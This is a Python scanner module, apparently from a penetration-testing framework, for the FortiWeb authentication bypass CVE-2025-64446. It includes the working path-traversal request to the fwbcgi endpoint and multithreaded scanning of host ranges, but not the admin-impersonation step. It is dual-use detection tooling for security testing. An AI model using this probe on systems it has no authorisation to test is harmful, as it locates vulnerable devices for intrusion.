import re
from concurrent.futures import ThreadPoolExecutor, as_completed
from dataclasses import dataclass, field
import requests
from requests.packages.urllib3.exceptions import InsecureRequestWarning
from core import colors
from core.auxiliary import Auxiliary
from core.check import CheckResult
from core.module import Option
from core.progress import ProgressBar

requests.packages.urllib3.disable_warnings(InsecureRequestWarning)


@dataclass
class HostResult:
    host: str
    vulnerable: bool = False
    errcode: int | None = None
    error: str | None = None


class FortiWebAuthBypass(Auxiliary):
    NAME = "FortiWeb Authentication Bypass (CVE-2025-64446)"
    DESCRIPTION = (
        "Detects path traversal and CGIINFO header forgery in FortiWeb that "
        "allows unauthenticated attackers to impersonate admin users. "
        "Non-intrusive check confirms traversal reachability without "
        "creating a persistent account."
    )

    AUTHOR = "K3ysTr0K3R"
    RANK = "great"
    SEVERITY = "critical"
    DISCLOSED = "2025-10-14"
    CHECK = True
    REFERENCES = [
        "CVE-2025-64446",
        "https://nvd.nist.gov/vuln/detail/CVE-2025-64446",
        "https://labs.watchtowr.com/when-the-impersonation-function-gets-used-to-impersonate-users-fortinet-fortiweb-auth-bypass/",
    ]

    OPTIONS = [
        Option("RHOSTS", required=True,
               description="target(s): host | h1,h2 | CIDR | range | file:path"),
        Option("RPORT", default=443, type=int, description="HTTPS management port"),
        Option("SSL", default=True, type=bool, description="use HTTPS"),
        Option("TIMEOUT", default=5.0, type=float, description="per-request timeout"),
        Option("THREADS", default=50, type=int, description="concurrent workers"),
        Option("STOP_ON_FIRST", default=False, type=bool,
               description="stop scanning after first vulnerable host"),
    ]

    TRAVERSAL_PATH = "/api/v2.0/cmdb/system/admin%3F/../../../../../cgi-bin/fwbcgi"

    def _expand_targets(self) -> list[str]:
        hosts = self.resolve_targets()
        if not hosts:
            raise ValueError("no targets — set RHOSTS (or use run <target>)")
        if len(hosts) > 1:
            print(colors.info(f"target list -> {len(hosts)} hosts"))
        return hosts

    def _base_url(self, host):
        scheme = "https" if self.options["SSL"] else "http"
        return f"{scheme}://{host}:{self.options['RPORT']}"

    def _probe(self, host):
        url = f"{self._base_url(host)}{self.TRAVERSAL_PATH}"
        return requests.post(
            url,
            headers={"Content-Type": "application/json", "User-Agent": "METIS/1.0"},
            data="{}",
            timeout=self.options["TIMEOUT"],
            verify=False,
            allow_redirects=False,
        )

    def _check_host(self, host: str, bar: ProgressBar | None = None) -> HostResult:
        result = HostResult(host=host)
        try:
            r = self._probe(host)
        except requests.exceptions.RequestException as e:
            result.error = type(e).__name__
            return result

        if r.status_code == 403:
            result.error = "HTTP 403 (patched)"
            return result
        if r.status_code == 200:
            result.vulnerable = True
            try:
                body = r.json()
                result.errcode = body.get("results", {}).get("errcode")
            except ValueError:
                pass
            return result
        result.error = f"HTTP {r.status_code}"
        return result

    def _record_host_result(self, h):
        svc_name = "https" if self.options["SSL"] else "http"
        self.report_host(h.host, state="up")
        self.report_service(
            h.host, self.options["RPORT"],
            proto="tcp", state="open",
            name=svc_name, banner="FortiWeb",
        )
        info = "traversal reached fwbcgi"
        if h.errcode is not None:
            info += " | errcode=" + str(h.errcode)
        self.report_vuln(
            name=self.NAME,
            address=h.host,
            severity="critical",
            refs="CVE-2025-64446",
            info=info,
        )

    def check(self):
        targets = self._expand_targets()
        if len(targets) > 1:
            print(colors.warn(
                f"check on multiple targets: probing only {targets[0]} "
                f"(use 'run' to scan all {len(targets)})"
            ))
        host = targets[0]
        print(colors.info(f"check: probing {self._base_url(host)}"))
        res = self._check_host(host)
        if res.vulnerable:
            print(colors.vuln(f"check: {host} vulnerable — traversal reached fwbcgi"))
            return CheckResult.VULNERABLE
        if res.error:
            print(colors.safe(f"check: {host} not vulnerable ({res.error})"))
        return CheckResult.SAFE

    def action(self):
        targets = self._expand_targets()
        threads = max(1, self.options["THREADS"])
        stop_first = self.options["STOP_ON_FIRST"]
        print(colors.info(f"scanning {len(targets)} host(s) with {threads} threads"))
        bar = ProgressBar(total=len(targets), prefix="scan")
        hits: list[HostResult] = []
        errors = 0
        aborted = False

        db = self._db()
        workspace_active = bool(db and db.current_workspace_id())

        try:
            with ThreadPoolExecutor(max_workers=threads) as ex:
                futures = {ex.submit(self._check_host, h, bar): h for h in targets}
                for fut in as_completed(futures):
                    bar.tick()
                    try:
                        res = fut.result()
                    except Exception:
                        errors += 1
                        continue
                    if res.vulnerable:
                        hits.append(res)
                        sig = f"errcode={res.errcode}" if res.errcode is not None else "HTTP 200"
                        bar.log(colors.vuln(f"{res.host} — {sig}"))
                        if workspace_active:
                            self._record_host_result(res)
                        if stop_first:
                            aborted = True
                            for f in futures:
                                f.cancel()
                            break
                    elif res.error:
                        errors += 1
        finally:
            bar.done()
        print()
        print(colors.heading("--- scan summary ---"))
        print(f"  targets:      {len(targets)}")
        print(f"  vulnerable:   {colors.green(str(len(hits)))}")
        print(f"  errors/skips: {colors.dimmed(str(errors))}")
        if aborted:
            print(colors.warn("  scan aborted early (STOP_ON_FIRST)"))
        if workspace_active and hits:
            ws = db.current_workspace()
            print("  recorded:     " + colors.dimmed(
                f"{len(hits)} host(s), {len(hits)} service(s), "
                f"{len(hits)} vuln(s) in workspace '{ws}'"
            ))
        if hits:
            print(colors.heading("  vulnerable hosts:"))
            for h in hits:
                sig = f"errcode={h.errcode}" if h.errcode is not None else "HTTP 200"
                print(f"    {colors.vuln(h.host)}  {sig}")
        return hits
